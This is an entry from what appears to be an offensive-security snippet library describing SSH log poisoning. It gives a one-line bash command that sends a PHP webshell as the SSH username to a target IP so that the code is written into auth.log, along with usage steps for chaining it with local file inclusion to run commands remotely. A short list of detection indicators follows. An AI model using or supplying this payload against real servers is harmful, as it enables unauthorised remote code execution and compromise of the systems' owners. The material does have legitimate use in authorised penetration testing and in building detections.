---
id: a63114ab-18e6-4183-8b87-ff2ef253357c
name: SSH-Inject-PHP-Payload
type: code
language: bash
verified: true
created_at: '2023-04-06T03:55:58.577226+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - log-poisoning
  - ssh
  - injection
validated: true
---

# SSH-Inject-PHP-Payload

## Code

```bash
ssh '<?php system($_GET["cmd"]);?>'@10.10.10.10
```

## Description

This bash command attempts an SSH connection using a PHP webshell as the username to a target IP, causing a failed authentication that logs the username (PHP code) into /var/log/auth.log. It poisons the log for later inclusion via LFI to achieve RCE.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 10.10.10.10 | Target IP address where SSH is running | 192.168.1.100 |

## Usage

Run this from an attacker machine to inject the payload into the target's SSH logs. The connection will fail, but the log entry persists. Follow up with LFI to include the log and execute commands. Adjust the IP to the vulnerable target's address; no credentials are needed as it's a deliberate failure.

## Detection

- SSH logs showing anomalous usernames containing PHP code or script tags.
- Failed connection attempts from unknown sources to port 22.
- Intrusion detection systems (IDS) alerting on suspicious SSH traffic patterns.

## Related

- [[procedures/LFI-to-RCE-via-SSH-Log-File-Inclusion]]
